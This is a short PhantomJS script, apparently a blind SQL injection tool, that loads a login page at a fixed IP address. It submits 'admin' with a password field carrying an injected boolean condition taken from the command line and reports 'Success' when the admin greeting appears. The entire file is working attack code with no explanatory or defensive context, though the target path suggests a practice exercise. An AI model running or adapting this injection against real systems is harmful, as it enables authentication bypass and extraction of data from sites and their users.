var page = new WebPage(), testindex = 0, loadInProgress = false;
//page.settings.javascriptEnabled = false;
var system = require('system');
var query = system.args[1];

console.log("Query = "+query);

page.onConsoleMessage = function(msg) {
  console.log(msg);
};

page.onLoadStarted = function() {
  loadInProgress = true;
};

page.onLoadFinished = function() {
  loadInProgress = false;
};

var steps = [
  function() {
    //Load Login Page
    page.open("http://54.204.80.192/example");
  },
  function() {
    //Enter Credentials
    page.evaluate(function(q) {

      var arr = document.getElementsByTagName("input");
      arr[0].value = "admin";
      arr[1].value = "' or "+q+" and 1='1";
      document.forms[0].submit();
    }, query);
  }, 
  function() {
    // Output content of page to stdout after form has been submitted
    val = page.evaluate(function() {
      //console.log(document.querySelectorAll('html')[0].outerHTML);
      if(document.querySelectorAll('html')[0].outerHTML.indexOf("Hello, admin!!") >= 0) {
           //console.log("Success");
	   return true;
      } else { return false; }
    });
    if(val) { console.log("Success "+query); } else { console.log("Failed"); }
  }
];


interval = setInterval(function() {
  if (!loadInProgress && typeof steps[testindex] == "function") {
    //console.log("step " + (testindex + 1));
    steps[testindex]();
    testindex++;
  }
  if (typeof steps[testindex] != "function") {
    //console.log("test complete!");
    phantom.exit();
  }
}, 50);
